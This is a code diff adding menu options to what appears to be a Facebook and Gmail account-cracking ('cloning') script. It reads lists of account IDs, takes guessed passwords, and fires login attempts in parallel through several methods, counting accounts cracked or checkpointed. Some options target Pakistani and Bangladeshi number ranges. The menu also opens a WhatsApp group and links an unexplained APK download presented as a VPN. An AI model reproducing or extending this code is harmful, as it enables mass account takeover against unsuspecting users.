@@ -209,15 +209,97 @@ def public():
         #       chk()
                 x = ("sex")
                 if x == ("sex"):
-                        print(' [1] Random gmail crack\n [0] Exit menu')
+                        print(' [1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random number cloning\n [5] Random gmail crack\n [6] WhatsApp Group (join)\n [7] Download Vpn\n [8] How To Use Video\n [0] Exit menu')
                         linex()
                         xd=input(' Choose an option: ')
-                    
-                    elif xd in ['1','01']:
+                        if xd in ['1','01']:
+                                clear()
+                                print(' Put file example:  /sdcard/File.txt  etc..')
+                                linex()
+                                file = input(' Put file path\033[1;37m: ')
+                                try:
+                                        fo = open(file,'r').read().splitlines()
+                                except FileNotFoundError:
+                                        print(' File location not found ')
+                                        time.sleep(1)
+                                        menu()
+                                clear()
+                                print(' All method working try 1 by 1 ')
+                                linex()
+                                print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
+                                linex()
+                                mthd=input(' Choose: ')
+                                linex()
+                                plist = []
+                                try:
+                                        ps_limit = int(input(' How many passwords do you want to add ? '))
+                                except:
+                                        ps_limit =1
+                                linex()
+                                print('\033[1;32m exp: first last,firtslast,first123')
+                                linex()
+                                for i in range(ps_limit):
+                                        plist.append(input(f' Put password {i+1}: '))
+                                linex()
+                                print(' Do you went show cp account? (y/n): ')
+                                linex()
+                                cx=input(' Choose: ')
+                                if cx in ['y','Y','yes','Yes','1']:
+                                        pcp.append('y')
+                                else:
+                                        pcp.append('n')
+                                with tred(max_workers=30) as crack_submit:
+                                        clear()
+                                        total_ids = str(len(fo))
+                                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
+                                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                                        linex()
+                                        for user in fo:
+                                                ids,names = user.split('|')
+                                                passlist = plist
+                                                if mthd in ['1','01']:
+                                                        crack_submit.submit(ffb,ids,names,passlist)
+                                                elif mthd in ['2','02']:
+                                                        crack_submit.submit(api,ids,names,passlist)
+                                                else:
+                                                        crack_submit.submit(api1,ids,names,passlist)
+                                print('\033[1;37m')
+                                linex()
+                                print(' The process has completed')
+                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                                linex()
+                                input(' Press enter to back ')
+                                os.system('python AKING.py')
+                        elif xd in ['2','02']:
+                                import dump
+                                dump.Main()
+                        elif xd in ['3','03']:
+                                public()
+                        elif xd in ['4','04']:
+                                clear()
+                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Gmail cloning\n [0] Back menu')
+                                linex()
+                                x=input(' Choose: ')
+                                if x in ['1','01']:
+                                        pak()
+                                elif x in ['2','02']:
+                                        bd()
+                                elif x in ['3','03']:
+                                        gmail()
+                                else:
+                                        menu()
+                        elif xd in ['5','05']:
                                 gmail()
-                    elif xd in ['0','00']:
-                                exit(' Thanks for use 🥰 ')    
-                    else:
+                        elif xd in ['6','06']:
+                                wx=('Dsj9JMWoixk4Qsje0Ng3nA')
+                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
+                        elif xd in ['7','07']:
+                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file');menu()
+                        elif xd in ['8','08']:
+                                os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
+                        elif xd in ['0','00']:
+                                exit(' Thanks for use 🥰 ')
+                        else:
                                 exit(' Option not found in menu...')
                         
                     def gmail():
